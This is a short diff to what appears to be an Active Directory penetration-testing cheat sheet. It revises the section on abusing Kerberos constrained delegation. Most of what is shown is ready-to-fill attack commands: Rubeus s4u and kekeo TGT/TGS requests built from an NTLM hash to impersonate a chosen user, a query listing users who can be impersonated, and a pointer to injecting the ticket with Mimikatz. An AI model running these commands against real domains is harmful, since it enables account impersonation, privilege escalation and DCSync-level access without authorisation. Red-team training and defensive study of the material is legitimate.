@@ -523,9 +523,10 @@ Get-DomainUser | ? {!($_.memberof -Match "Protected Users")} | select samaccount
 
 #### Rubeus request and inject TGT + TGS
 - Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
-- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right
+- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right. 
+- Make sure they are local admin on the target machine.
 ```
-.\Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:administrator /domain:<DOMAIN> /msdsspn:<SERVICE ALLOWED TO DELEGATE>/<SERVER FQDN> /altservice:<SECOND SERVICE> /<SERVER FQDN> /ptt
+.\Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:<USER> /domain:<DOMAIN> /msdsspn:<SERVICE ALLOWED TO DELEGATE>/<SERVER FQDN> /altservice:<SECOND SERVICE> /<SERVER FQDN> /ptt
 ```
 
 #### Requesting TGT with kekeo
@@ -536,7 +537,7 @@ Tgt::ask /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM HASH>
 
 #### Requesting TGS with kekeo
 ```
-Tgs::s4u /tgt:<TGT> /user:Administrator@<DOMAIN> /service:<SERVICE ALLOWED TO DELEGATE/<FQDN SERVER>|<SECOND SERVICE>/<SERVER FQDN>
+Tgs::s4u /tgt:<TGT> /user:<USER>@<DOMAIN> /service:<SERVICE ALLOWED TO DELEGATE/<FQDN SERVER>|<SECOND SERVICE>/<SERVER FQDN>
 ```
 
 #### Use Mimikatz to inject the TGS ticket
